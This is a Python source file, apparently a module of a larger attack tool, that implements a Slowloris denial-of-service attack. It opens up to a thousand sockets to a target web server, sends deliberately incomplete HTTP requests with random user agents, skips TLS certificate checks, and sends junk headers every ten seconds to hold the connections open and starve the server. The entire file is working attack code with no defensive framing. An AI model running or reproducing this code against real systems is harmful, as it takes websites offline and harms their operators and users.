import socket
import ssl
import random
import time
from urllib.parse import urlparse
from core.useragent import UserAgent

class Slowloris:
    def __init__(self, url, threads=500, sockets=1000, duration=0, proxy_file=None, stats=None):
        self.url = url
        parsed = urlparse(url)
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        self.is_ssl = parsed.scheme == 'https'
        self.path = parsed.path or '/'
        self.sockets_count = sockets
        self.duration = duration
        self.stats = stats
        self.sockets = []
        self.running = False
    
    def _create_socket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self.host, self.port))
            
            if self.is_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=self.host)
            
            ua = UserAgent.random_agent()
            req = (
                f"GET {self.path}?{random.randint(0, 2000)} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept-language: en-US,en\r\n"
            )
            s.send(req.encode())
            
            if self.stats:
                self.stats.increment_sent()
                self.stats.add_bytes(len(req))
            return s
        except:
            if self.stats:
                self.stats.increment_failed()
            return None
    
    def attack(self):
        self.running = True
        
        # Initial sockets
        for _ in range(self.sockets_count):
            s = self._create_socket()
            if s: self.sockets.append(s)
        
        start = time.time()
        while self.running:
            if self.duration > 0 and (time.time() - start) > self.duration:
                break
            
            # Keep alive
            dead = []
            for s in self.sockets:
                try:
                    keep = f"X-a: {random.randint(1, 5000)}\r\n"
                    s.send(keep.encode())
                    if self.stats:
                        self.stats.add_bytes(len(keep))
                except:
                    dead.append(s)
            
            for d in dead:
                self.sockets.remove(d)
                new = self._create_socket()
                if new: self.sockets.append(new)
            
            time.sleep(10)
        
        for s in self.sockets:
            try: s.close()
            except: pass
